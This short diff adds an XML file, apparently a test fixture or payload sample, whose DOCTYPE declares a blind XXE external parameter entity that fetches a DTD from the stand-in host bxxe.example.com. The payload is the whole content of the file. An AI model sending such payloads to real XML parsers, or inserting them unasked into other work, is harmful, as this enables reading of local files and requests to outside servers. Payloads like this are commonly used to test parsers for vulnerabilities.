@@ -1,0 +1,2 @@
+<!DOCTYPE test [<!ENTITY % blind SYSTEM "http://bxxe.example.com/bxxedouble.dtd"> %blind;]>
+<x></x>
